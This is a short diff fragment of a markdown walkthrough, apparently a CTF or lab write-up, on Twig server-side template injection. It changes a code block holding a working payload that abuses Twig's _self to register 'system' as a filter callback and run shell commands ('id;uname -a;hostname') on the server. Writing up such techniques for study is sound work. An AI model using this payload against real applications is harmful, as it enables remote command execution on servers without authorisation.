@@ -589,11 +589,8 @@ Twig has a variable `_self`, which makes a few of the internal APIs public. We c
 - Invoke `_self.env.getFilter()` to execute the function we have just registered
 
 ```php
-_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")
+\{\{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")\}\}
 ```
-
-> With double `{}` at the beginning and end 
-{: .prompt-info}
 
 Let's upload it:
 ```console
